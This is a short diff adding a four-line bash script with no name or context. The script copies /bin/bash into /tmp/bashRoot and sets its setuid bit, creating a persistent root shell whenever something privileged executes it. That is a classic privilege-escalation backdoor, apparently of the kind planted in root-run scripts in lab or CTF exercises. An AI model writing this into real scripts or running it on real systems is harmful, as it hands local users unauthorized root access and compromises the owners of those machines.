@@ -1,0 +1,4 @@
+#!/bin/bash
+
+cp /bin/bash /tmp/bashRoot
+chmod +s /tmp/bashRoot
